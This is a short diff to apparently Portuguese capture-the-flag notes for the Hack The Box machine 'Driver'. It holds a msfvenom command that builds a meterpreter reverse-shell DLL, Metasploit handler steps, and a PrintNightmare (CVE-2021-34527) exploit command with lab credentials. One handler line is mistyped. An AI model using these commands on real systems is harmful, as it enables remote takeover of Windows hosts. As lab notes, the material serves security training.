@@ -72,6 +72,16 @@ https://github.com/cube0x0/CVE-2021-1675
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f dll -o glrn.dll
 
+Abrir o msfconsole
+
+Use multi/handler
+Set payload windows/x64/meterpreter/reverse_tcp
+
+set lhhost = tun0
+
+exploit
+
+Upar a dll no site
+
 
 python3 CVE-2021-34527.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.14.42\open\glrn.dll'
-
